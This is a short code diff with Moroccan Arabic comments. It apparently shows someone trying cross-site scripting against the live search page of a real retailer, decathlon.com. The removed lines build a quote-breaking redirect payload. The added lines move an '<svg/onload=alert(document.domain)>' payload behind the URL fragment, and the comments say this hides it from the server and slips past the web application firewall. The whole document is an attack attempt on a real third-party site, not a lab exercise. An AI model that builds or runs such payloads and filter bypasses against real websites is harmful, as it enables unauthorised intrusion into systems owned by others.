@@ -1,7 +1,11 @@
 <script>
-    // هاد الكود كيحاول غير يدير redirect لـ google فاش كيتحل decathlon
-    // إذا خدم، كيعني أننا قدرنا نكسرو الـ HTML ونفذو JS
-    let payload = "';location='https://www.google.com';//";
-    let target = "https://www.decathlon.com/search?q=" + encodeURIComponent(payload);
+    // غادي نحطو السم (Payload) مورا الـ # باش السيرفر ما يشوفوش وما يبلكيهش
+    // والـ XSS ديالنا غادي يقرا راسو براسو من الـ URL
+    
+    let xssPayload = "alert(document.domain)";
+    
+    // هاد الرابط كيهرب من الـ WAF حيت الكود كاين مورا الـ #
+    let target = "https://www.decathlon.com/search?q=test#<svg/onload=" + xssPayload + ">";
+    
     window.location.href = target;
 </script>
